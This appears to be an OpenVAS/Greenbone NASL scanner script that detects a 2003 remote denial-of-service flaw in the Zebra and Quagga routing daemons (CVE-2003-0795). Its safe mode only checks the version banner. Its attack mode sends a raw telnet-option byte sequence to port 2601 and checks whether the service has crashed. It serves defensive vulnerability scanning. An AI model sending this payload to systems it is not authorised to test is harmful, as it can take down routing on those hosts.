# SPDX-FileCopyrightText: 2003 Matt North
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11925");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_xref(name:"RHSA", value:"RHSA-2003:307-01");
  script_cve_id("CVE-2003-0795", "CVE-2003-0858");
  script_name("Zebra and Quagga Remote DoS Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2003 Matt North");
  script_family("Denial of Service");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/zebra", 2601);

  script_xref(name:"URL", value:"http://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=107140");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/9029");

  script_tag(name:"solution", value:"Update to Quagga Version 0.96.4 or later.");

  script_tag(name:"summary", value:"A remote DoS exists in Zebra and/or Quagga when sending a telnet option
  delimiter with no actual option data.");

  script_tag(name:"impact", value:"An attacker may exploit this flaw to prevent this host from doing proper
  routing.");

  script_tag(name:"affected", value:"All versions from 0.90a to 0.93b.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port( default:2601, proto:"zebra" );

if(safe_checks()) {
  banner = get_kb_item("zebra/banner/" + port);
  if(!banner)
    exit(0);

  if(egrep(string:banner, pattern:"Hello, this is zebra \(version 0\.9[0-3][ab]?\)")) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = raw_string(0xff,0xf0,0xff,0xf0,0xff,0xf0);

send(socket:soc, data:s);
r = recv(socket:soc, length:1024);
close(soc);

alive = open_sock_tcp(port);
if(!alive) {
  security_message(port:port);
  exit(0);
} else {
  close(alive);
  exit(99);
}
